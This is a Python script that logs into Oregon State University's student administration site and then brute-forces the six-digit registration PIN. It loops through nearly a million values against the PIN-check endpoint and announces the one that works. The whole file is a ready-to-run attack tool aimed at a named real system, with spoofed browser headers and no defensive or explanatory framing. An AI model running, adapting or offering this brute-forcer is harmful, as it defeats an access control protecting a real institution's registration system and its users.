import argparse

import requests
from pyquery import PyQuery as pq


req = requests.Session()
req.headers = {'User-Agent' : 'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16', 'Accept' : 'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5', 'Accept-Charset' : 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Accept-Encoding' : 'gzip,deflate,sdch', 'Accept-Language' : 'en-US,en;q=0.8', 'Cache-Control' : 'max-age=0', 'Connection' : 'keep-alive', 'Host' : 'adminfo.ucsadm.oregonstate.edu', 'Referer' : 'https://adminfo.ucsadm.oregonstate.edu/prod/twbkwbis.P_WWWLogin'}
cookie = {}


def page_title(res):
    return pq(res.content)('title').text()


def login(sid, pin):
    req.headers['Referer'] = 'https://adminfo.ucsadm.oregonstate.edu/prod/twbkwbis.P_WWWLogin'
    url = 'https://adminfo.ucsadm.oregonstate.edu/prod/twbkwbis.P_ValLogin'
    res = req.get(url)
    res = req.post(url, {'sid' : sid, 'PIN' : pin})

    if page_title(res) == 'Login':
        return False
    return True


def select_term():
    req.headers['Referer'] = 'https://adminfo.ucsadm.oregonstate.edu/prod/twbkwbis.P_GenMenu?name=bmenu.P_RegMnu'
    url = 'https://adminfo.ucsadm.oregonstate.edu/prod/bwskfreg.P_AltPin'
    res = req.get(url)

    if page_title(res) == 'Select Term':
        res = req.post(url, {'term_in': '201303'})
        if page_title(res) == 'Registration PIN Verification':
            return True
    elif page_title(res) == 'Registration PIN Verification':
        return True


def attempt_pin(pin):
    pin = pin.rjust(6, '0')
    req.headers['Referer'] = 'https://adminfo.ucsadm.oregonstate.edu/prod/bwskfreg.P_AltPin'
    res = req.post('https://adminfo.ucsadm.oregonstate.edu/prod/bwskfreg.P_CheckAltPin', {'pin': pin})

    print pin
    if page_title(res) != 'Registration PIN Verification':
        print "THOUSANDPINSTRIKE COMPLETE: " + pin
    elif not 'NOTFOUND' in res.content:
        print "Pin attempt failed."


def main(args):
    print "Logging in"
    if not login(args.username, args.password):
        print "[ERR] Could not login."
        return
    else:
        print "Selecting term"
        if not select_term():
            print "[ERR] Could not select term."
            return
    print "INITIATE THOUSANDPINSTRIKE"
    for pin in range(20000, 1000000):
        attempt_pin(str(pin))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Striker On.')
    parser.add_argument('-u', '--username')
    parser.add_argument('-p', '--password')
    args = parser.parse_args()
    main(args)
